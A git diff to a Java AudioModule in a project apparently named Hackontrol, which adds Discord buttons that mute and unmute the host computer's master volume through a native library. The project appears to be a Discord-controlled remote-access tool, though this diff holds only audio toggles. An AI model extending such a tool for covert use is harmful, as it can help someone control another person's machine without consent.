@@ -6,8 +6,11 @@ import com.khopan.hackontrol.manager.interaction.ButtonManager;
 import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.ModalContext;
+import com.khopan.hackontrol.manager.interaction.Question;
+import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
@@ -18,6 +21,9 @@ import net.dv8tion.jda.api.interactions.modals.ModalMapping;
 
 public class AudioModule extends Module {
 	private static final String MODULE_NAME = "audio";
+
+	private static final Button BUTTON_MUTE          = ButtonManager.staticButton(ButtonType.SUCCESS, "Mute", "muteMaster");
+	private static final Button BUTTON_UNMUTE        = ButtonManager.staticButton(ButtonType.DANGER, "Unmute", "unmuteMaster");
 
 	private static final Button BUTTON_CHANGE_VOLUME = ButtonManager.staticButton(ButtonType.SUCCESS, "Change Volume", "changeVolume");
 
@@ -30,13 +36,30 @@ public class AudioModule extends Module {
 
 	@Override
 	public void preInitialize(Registry registry) {
+		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_MUTE,          context -> this.buttonMute(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_UNMUTE,        context -> this.buttonMute(context, false));
 		registry.register(InteractionManager.BUTTON_REGISTRY, AudioModule.BUTTON_CHANGE_VOLUME, this :: buttonChangeVolume);
 		registry.register(InteractionManager.MODAL_REGISTRY,  AudioModule.MODAL_CHANGE_VOLUME,  this :: modalChangeVolume);
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(AudioModule.BUTTON_CHANGE_VOLUME)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(AudioModule.BUTTON_MUTE, AudioModule.BUTTON_UNMUTE), ActionRow.of(AudioModule.BUTTON_CHANGE_VOLUME)).queue();
+	}
+
+	private void buttonMute(ButtonContext context, boolean mute) {
+		if(NativeLibrary.mute() == mute) {
+			HackontrolMessage.boldDeletable(context.reply(), "Master volume is already " + (mute ? "muted" : "unmuted"));
+			return;
+		}
+
+		if(!mute) {
+			Question.positive(context.reply(), "Are you sure you want to unmute?", QuestionType.YES_NO, () -> NativeLibrary.mute(false));
+			return;
+		}
+
+		NativeLibrary.mute(true);
+		context.deferEdit().queue();
 	}
 
 	private void buttonChangeVolume(ButtonContext context) {
